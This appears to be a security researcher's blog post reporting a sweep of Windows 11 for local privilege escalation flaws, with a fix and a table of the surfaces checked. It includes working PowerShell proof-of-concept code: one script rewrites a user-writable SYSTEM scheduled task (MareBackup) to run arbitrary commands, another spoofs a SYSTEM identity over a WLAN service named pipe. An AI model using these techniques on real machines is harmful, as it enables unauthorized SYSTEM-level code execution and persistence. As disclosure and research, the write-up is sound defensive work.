@@ -1,0 +1,178 @@
+# https://bikini.github.io/blog/2026-05-07-windows/
+
+<!DOCTYPE html><html lang="en" data-astro-cid-bvzihdzo=""> <body data-astro-cid-bvzihdzo="">  <main data-astro-cid-bvzihdzo=""> <article data-astro-cid-bvzihdzo=""> <div class="hero-image" data-astro-cid-bvzihdzo="">  </div> <div class="prose" data-astro-cid-bvzihdzo=""> <div class="title" data-astro-cid-bvzihdzo=""> <div class="category" data-astro-cid-bvzihdzo="">exploits</div> <div class="date" data-astro-cid-bvzihdzo=""> <time datetime="2026-05-07T00:00:00.000Z"> May 7, 2026 </time>  </div> <h1 data-astro-cid-bvzihdzo="">windows 11 — SYSTEM-context scheduled task writable by any user, world-writable named pipes with SID spoofing, and what the local privilege escalation surface looks like after a thorough sweep</h1> <hr data-astro-cid-bvzihdzo=""> </div>  <p>I spent a few days scanning Windows 11 for local privilege escalation primitives. Not looking at kernel exploits or driver bugs — looking at the <em>configuration surface</em>: scheduled tasks, named pipes, services, COM objects, registry loadpoints, WMI subscriptions, device ACLs, AppX manifests. The kind of misconfigurations that give you SYSTEM from a medium-integrity unprivileged shell because someone set an ACL wrong or trusted a client-supplied value in a named pipe protocol.</p>
+<p>The strongest confirmed finding is a <strong>Microsoft-signed scheduled task (<code>MareBackup</code>)</strong> whose task definition file is writable by <code>BUILTIN\Users</code> due to an embedded SDDL granting <code>GenericAll</code>. The task runs as SYSTEM. Overwrite the task definition → SYSTEM code execution on next scheduler reload or reboot. Not instant, but persistent and reliable.</p>
+<p>The second finding is a <strong>world-writable named pipe (<code>WiFiNetworkManagerTask</code>)</strong> where the listening service (<code>WlanSvc</code>) trusts a client-supplied SID at offset 0x14 of the init message. You can claim to be SYSTEM (<code>S-1-5-18</code>), and the service responds accordingly.</p>
+<p>The third is a <strong>NULL-DACL named pipe</strong> exposed by Realtek’s HD Audio Universal Service running as LocalSystem. World-accessible, no authentication.</p>
+<p>After those three, I swept 20+ additional attack surface classes and found nothing stronger than MareBackup. The kernel surface (KSecDD, PEAuth) has interesting IOCTL maps but the sensitive operations are gated behind protected-process and admin checks that hold up.</p>
+<h2 id="marebackup--system-task-writable-by-any-user">MareBackup — SYSTEM task writable by any user</h2>
+<p><code>\Microsoft\Windows\Application Experience\MareBackup</code> is a Microsoft-signed scheduled task that runs as <code>NT AUTHORITY\SYSTEM</code>. The task definition XML is stored in <code>C:\Windows\System32\Tasks\Microsoft\Windows\Application Experience\MareBackup</code>. The embedded SDDL in the task’s security descriptor grants <code>GenericAll</code> to <code>BUILTIN\Users</code>:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#E6EDF3">$task </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> Get-ScheduledTask</span><span style="color:#FF7B72"> -</span><span style="color:#E6EDF3">TaskPath </span><span style="color:#A5D6FF">"\Microsoft\Windows\Application Experience\"</span><span style="color:#FF7B72"> -</span><span style="color:#E6EDF3">TaskName </span><span style="color:#A5D6FF">"MareBackup"</span></span>
+<span class="line"><span style="color:#E6EDF3">$sd </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> $task.Settings.SecurityDescriptor</span></span>
+<span class="line"><span style="color:#8B949E"># SDDL contains: (A;;GA;;;BU) — GenericAll to BUILTIN\Users</span></span></code></pre>
+<p>From a medium-integrity shell (standard user, no elevation):</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#8B949E"># verify read/write access to the task definition file</span></span>
+<span class="line"><span style="color:#E6EDF3">$path </span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF"> "C:\Windows\System32\Tasks\Microsoft\Windows\Application Experience\MareBackup"</span></span>
+<span class="line"><span style="color:#E6EDF3">$acl </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> Get-Acl</span><span style="color:#E6EDF3"> $path</span></span>
+<span class="line"><span style="color:#E6EDF3">$acl.Access </span><span style="color:#FF7B72">|</span><span style="color:#79C0FF"> Where-Object</span><span style="color:#E6EDF3"> { </span><span style="color:#79C0FF">$_</span><span style="color:#E6EDF3">.IdentityReference </span><span style="color:#FF7B72">-match</span><span style="color:#A5D6FF"> "Users"</span><span style="color:#E6EDF3"> } </span><span style="color:#FF7B72">|</span><span style="color:#79C0FF"> Format-Table</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#8B949E"># IdentityReference      FileSystemRights  AccessControlType</span></span>
+<span class="line"><span style="color:#8B949E"># ------------------     ----------------  -----------------</span></span>
+<span class="line"><span style="color:#8B949E"># BUILTIN\Users          FullControl       Allow</span></span></code></pre>
+<p>The task action specifies a command that runs as SYSTEM. Rewriting the task XML to change the <code>&lt;Exec&gt;&lt;Command&gt;</code> element gives you arbitrary SYSTEM code execution. The limitation: the Task Scheduler’s COM interface rejects live modifications from an unelevated context (<code>E_ACCESSDENIED</code>), so direct XML edits aren’t reflected until the scheduler reloads — either on reboot or when the Task Scheduler service restarts.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#8B949E"># PoC: overwrite task definition with modified action</span></span>
+<span class="line"><span style="color:#E6EDF3">$xml </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> [</span><span style="color:#FF7B72">xml</span><span style="color:#E6EDF3">](</span><span style="color:#79C0FF">Get-Content</span><span style="color:#E6EDF3"> $path)</span></span>
+<span class="line"><span style="color:#E6EDF3">$ns </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> New-Object</span><span style="color:#E6EDF3"> Xml.XmlNamespaceManager($xml.NameTable)</span></span>
+<span class="line"><span style="color:#E6EDF3">$ns.AddNamespace(</span><span style="color:#A5D6FF">"t"</span><span style="color:#FF7B72">,</span><span style="color:#A5D6FF"> "http://schemas.microsoft.com/windows/2004/02/mit/task"</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">$exec </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> $xml.SelectSingleNode(</span><span style="color:#A5D6FF">"//t:Exec/t:Command"</span><span style="color:#FF7B72">,</span><span style="color:#E6EDF3"> $ns)</span></span>
+<span class="line"><span style="color:#E6EDF3">$exec.InnerText </span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF"> "cmd.exe /c whoami &gt; C:\Windows\Temp\marebackup_proof.txt"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">$xml.Save($path)</span></span>
+<span class="line"><span style="color:#8B949E"># after reboot or scheduler restart: SYSTEM shell writes proof file</span></span></code></pre>
+<p>This is a delayed/persistent SYSTEM code execution primitive. Not instant exploitation — but in the context of a multi-step attack where you’ve already landed on the box, it’s a clean persistence mechanism that survives reboots and fires under the SYSTEM context. The fact that it’s a Microsoft-signed task definition with a GenericAll ACE for Users is the root cause — the SDDL should never have granted write access to unprivileged accounts.</p>
+<h2 id="wifinetworkmanagertask--world-writable-pipe-with-sid-spoofing">WiFiNetworkManagerTask — world-writable pipe with SID spoofing</h2>
+<p><code>\\.\pipe\WiFiNetworkManagerTask</code> is a named pipe created by the Windows WLAN Service (<code>WlanSvc</code>). The pipe’s SDDL grants write access to everyone:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#8B949E"># enumerate pipe DACL</span></span>
+<span class="line"><span style="color:#E6EDF3">$pipe </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> [</span><span style="color:#FF7B72">System.IO.Pipes.NamedPipeClientStream</span><span style="color:#E6EDF3">]::new(</span><span style="color:#A5D6FF">"."</span><span style="color:#FF7B72">,</span><span style="color:#A5D6FF"> "WiFiNetworkManagerTask"</span><span style="color:#FF7B72">,</span><span style="color:#E6EDF3"> [</span><span style="color:#FF7B72">System.IO.Pipes.PipeDirection</span><span style="color:#E6EDF3">]::InOut)</span></span>
+<span class="line"><span style="color:#E6EDF3">$pipe.Connect(</span><span style="color:#79C0FF">5000</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#8B949E"># connection succeeds from medium-integrity token — world-writable confirmed</span></span></code></pre>
+<p>The service reads an init message from the client and trusts the SID field at byte offset 0x14. No verification against the actual client token. You can send SYSTEM’s SID (<code>S-1-5-18</code>) and the service treats you as SYSTEM for subsequent operations:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#8B949E"># structure: [header(20 bytes)][SID at offset 0x14][payload]</span></span>
+<span class="line"><span style="color:#E6EDF3">$ms </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> New-Object</span><span style="color:#E6EDF3"> System.IO.MemoryStream</span></span>
+<span class="line"><span style="color:#E6EDF3">$bw </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> New-Object</span><span style="color:#E6EDF3"> System.IO.BinaryWriter($ms)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#8B949E"># header</span></span>
+<span class="line"><span style="color:#E6EDF3">$bw.Write([</span><span style="color:#FF7B72">uint32</span><span style="color:#E6EDF3">]</span><span style="color:#79C0FF">1</span><span style="color:#E6EDF3">)    </span><span style="color:#8B949E"># message type: init</span></span>
+<span class="line"><span style="color:#E6EDF3">$bw.Write([</span><span style="color:#FF7B72">uint32</span><span style="color:#E6EDF3">]</span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">)    </span><span style="color:#8B949E"># flags</span></span>
+<span class="line"><span style="color:#E6EDF3">$bw.Write([</span><span style="color:#FF7B72">uint32</span><span style="color:#E6EDF3">]</span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">)    </span><span style="color:#8B949E"># reserved</span></span>
+<span class="line"><span style="color:#E6EDF3">$bw.Write([</span><span style="color:#FF7B72">uint32</span><span style="color:#E6EDF3">]</span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">)    </span><span style="color:#8B949E"># reserved</span></span>
+<span class="line"><span style="color:#E6EDF3">$bw.Write([</span><span style="color:#FF7B72">uint32</span><span style="color:#E6EDF3">]</span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">)    </span><span style="color:#8B949E"># reserved</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#8B949E"># SID: S-1-5-18 (SYSTEM)</span></span>
+<span class="line"><span style="color:#E6EDF3">$systemSid </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> New-Object</span><span style="color:#E6EDF3"> System.Security.Principal.SecurityIdentifier(</span><span style="color:#A5D6FF">"S-1-5-18"</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">$sidBytes </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> New-Object</span><span style="color:#E6EDF3"> byte[] $systemSid.BinaryLength</span></span>
+<span class="line"><span style="color:#E6EDF3">$systemSid.GetBinaryForm($sidBytes</span><span style="color:#FF7B72">,</span><span style="color:#79C0FF"> 0</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">$bw.Write($sidBytes)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">$pipe.Write($ms.ToArray()</span><span style="color:#FF7B72">,</span><span style="color:#79C0FF"> 0</span><span style="color:#FF7B72">,</span><span style="color:#E6EDF3"> $ms.Length)</span></span>
+<span class="line"><span style="color:#E6EDF3">$pipe.Flush()</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#8B949E"># read response — service writes back data push assuming we are SYSTEM</span></span>
+<span class="line"><span style="color:#E6EDF3">$buf </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> New-Object</span><span style="color:#E6EDF3"> byte[] </span><span style="color:#79C0FF">4096</span></span>
+<span class="line"><span style="color:#E6EDF3">$n </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> $pipe.Read($buf</span><span style="color:#FF7B72">,</span><span style="color:#79C0FF"> 0</span><span style="color:#FF7B72">,</span><span style="color:#E6EDF3"> $buf.Length)</span></span>
+<span class="line"><span style="color:#E6EDF3">[</span><span style="color:#FF7B72">System.Text.Encoding</span><span style="color:#E6EDF3">]::UTF8.GetString($buf</span><span style="color:#FF7B72">,</span><span style="color:#79C0FF"> 0</span><span style="color:#FF7B72">,</span><span style="color:#E6EDF3"> $n)</span></span></code></pre>
+<p>The service acknowledges the spoofed identity and pushes data back. What you can do with the spoofed context depends on the service’s internal protocol — it manages WiFi network state, connection identifiers, and credential handles. The confirmed capabilities are SID spoofing and connection ID manipulation. I was not able to escalate this to arbitrary code execution or credential extraction in the time I spent on it, but the trust-client-supplied-SID pattern is a clear design flaw.</p>
+<p>Initial testing suggested pipe monopoly DoS and service crash were also possible, but those turned out to be Frida instrumentation artifacts — the service didn’t actually crash when tested without the debugger attached.</p>
+<h2 id="realtek-hd-audio--null-dacl-pipe-to-localsystem">Realtek HD Audio — NULL-DACL pipe to LocalSystem</h2>
+<p>Realtek’s HD Audio Universal Service runs as <code>NT AUTHORITY\SYSTEM</code> and exposes a named pipe at <code>\\.\pipe\RtkAudUServiceNamedPipe</code> with a <strong>NULL DACL</strong> — meaning the pipe has no access control at all. Any process on the system can connect.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#8B949E"># verify NULL DACL</span></span>
+<span class="line"><span style="color:#E6EDF3">$pipe </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> [</span><span style="color:#FF7B72">System.IO.Pipes.NamedPipeClientStream</span><span style="color:#E6EDF3">]::new(</span><span style="color:#A5D6FF">"."</span><span style="color:#FF7B72">,</span><span style="color:#A5D6FF"> "RtkAudUServiceNamedPipe"</span><span style="color:#FF7B72">,</span><span style="color:#E6EDF3"> [</span><span style="color:#FF7B72">System.IO.Pipes.PipeDirection</span><span style="color:#E6EDF3">]::InOut)</span></span>
+<span class="line"><span style="color:#E6EDF3">$pipe.Connect(</span><span style="color:#79C0FF">3000</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#8B949E"># connection succeeds — no access denied</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#8B949E"># the service also exposes COM: CLSID {615AC66B-72C3-4DEB-8F22-19B372142787}</span></span></code></pre>
+<p>The service accepts messages over the pipe and exposes COM methods. The attack surface exists — a LocalSystem service with a world-accessible pipe is a classic EoP target — but exploiting it requires understanding the Realtek-proprietary protocol spoken over the pipe. This is a “the door is unlocked, the hallway is long” situation. The pipe is wide open; whether you can reach something useful through it requires more RE of the Realtek service binary than I invested. Flagging it as a confirmed exposed surface for anyone who wants to dig deeper.</p>
+<h2 id="the-kernel-surface--ksecdd-and-peauth">the kernel surface — KSecDD and PEAuth</h2>
+<p>Two kernel devices stood out during surface scanning as interesting targets:</p>
+<p><strong>KSecDD</strong> (<code>\Device\KSecDD</code>) has a rich IOCTL surface. I recovered the static IOCTL dispatch map from the <code>KSecDD!FastIoDeviceControl</code> handler. The sensitive primitives include pool/VM memory copy, LSA handle duplication, protected-process operations, and callback handler registration. However, the gating is solid: sensitive IOCTLs return <code>STATUS_ACCESS_DENIED</code> for non-admin, non-protected callers. I didn’t find a bypass.</p>
+<p><strong>PEAuth</strong> (<code>\Device\PEAuth</code>) accepts a single IOCTL (<code>0x9c412400</code>). The driver has interesting imports (<code>MmCopyVirtualMemory</code>, <code>ZwAllocateVirtualMemory</code>, <code>ZwDuplicateToken</code>) but the IOCTL validation rejects unprivileged callers before reaching any sensitive codepath.</p>
+<p><strong>Bfs</strong> (<code>\Device\Bfs</code>) is openable from a medium-integrity token. IOCTL <code>0x228004</code> accepts a structured request with a caller token handle and NT path. But it returns <code>0xC000A200</code> — “operation only valid in app container” — gating the interesting functionality to app-container contexts only.</p>
+<p><strong>Ahcache</strong> (<code>\\.\ahcache</code>) is also user-openable. It has cache management commands, but the privileged operations return access denied. Only harmless query commands succeed from a standard user token.</p>
+<h2 id="the-broader-surface-scan">the broader surface scan</h2>
+<p>After confirming MareBackup as the strongest finding, I systematically scanned 20+ additional attack surface classes to make sure I wasn’t missing something better. None of these yielded a stronger primitive:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Surface</th><th>Method</th><th>Result</th></tr></thead><tbody><tr><td>Service ACLs</td><td><code>sc sdshow</code> on all services — check WRITE_DAC, WRITE_OWNER, SERVICE_CHANGE_CONFIG</td><td>0 writable services from medium-integrity</td></tr><tr><td>Service binary paths</td><td>Check write access to every service binary</td><td>0 writable binaries</td></tr><tr><td>Device ACLs</td><td>Open <code>\Device\*</code> namespace, check GenericWrite/GenericAll</td><td>Bfs and Ahcache openable, gated as described above</td></tr><tr><td>Named pipes</td><td>Full enumeration with SDDL analysis</td><td>WiFiNetworkManagerTask and RtkAudUServiceNamedPipe only interesting ones</td></tr><tr><td>WMI subscriptions</td><td>Attempt permanent event subscription from standard user</td><td>Access denied on all namespace writes</td></tr><tr><td>WMI namespace ACLs</td><td>Recursive namespace DACL enumeration</td><td>All writable namespaces are low-value</td></tr><tr><td>COM server registration</td><td>16,479 HKLM registrations scanned for elevation flags, writability</td><td>1 potentially plantable target (weaker than MareBackup)</td></tr><tr><td>HKLM registry loadpoints</td><td>59 high-value autorun/loadpoint keys checked</td><td>0 writable from medium-integrity</td></tr><tr><td>AppX manifests</td><td>3,776 application rows analyzed for writable targets</td><td>0 writable from medium-integrity</td></tr><tr><td>AlwaysInstallElevated</td><td>Registry check for MSI elevation policy</td><td>Not set (default safe)</td></tr><tr><td>Unquoted service paths</td><td>Parse all service ImagePath values for spaces without quotes</td><td>None exploitable (all quoted or no spaces in writable segments)</td></tr><tr><td>DLL search order</td><td>Check service/task DLL dependencies in writable directories</td><td>None found</td></tr><tr><td>Scheduled task ACLs</td><td>Full task tree enumeration with embedded SDDL parsing</td><td>MareBackup is the only one with user-writable SDDL</td></tr><tr><td>Task action target writability</td><td>Check if task command targets are in writable paths</td><td>0 writable (all in System32 or Program Files)</td></tr><tr><td>WSL COM interfaces</td><td>Probe LxssUserSession and IWslSupport</td><td>Read-only enumeration succeeds, no write/execute primitives</td></tr><tr><td>RPC endpoints</td><td>Survey high-privilege RPC servers</td><td>embeddedmodesvc has 3 marshaled methods, all gated</td></tr></tbody></table>
+<p>The surface is well-locked-down on a default Windows 11 install. MareBackup is the exception — a single misconfigured SDDL on a SYSTEM-context task definition that grants full control to unprivileged users. Everything else either has proper ACLs, is gated behind admin/protected-process checks, or requires preconditions that don’t exist on default configurations.</p>
+<h2 id="bottom-line">bottom line</h2>
+<p>MareBackup is the only confirmed Windows OS privilege escalation with a validated impact path from this sweep. It’s a configuration-class bug — wrong ACL on a task definition — not a code-execution vulnerability. The fix is trivial: remove the <code>(A;;GA;;;BU)</code> ACE from the task’s SDDL. Whether it’s impactful depends on your threat model: if you assume the attacker already has a low-privilege shell and you care about persistence, it’s a clean SYSTEM persistence mechanism that requires no exploit development. If you need instant interactive SYSTEM access, this isn’t it — it fires on scheduler reload, not on demand.</p>
+<p>The WiFi pipe SID spoofing is architecturally interesting and the Realtek NULL-DACL pipe is a wide-open surface to a SYSTEM service, but neither yielded confirmed privilege escalation in the time I spent. They’re leads for anyone willing to invest more RE time into the service protocols.</p>  </div> </article> </main>  </body></html>
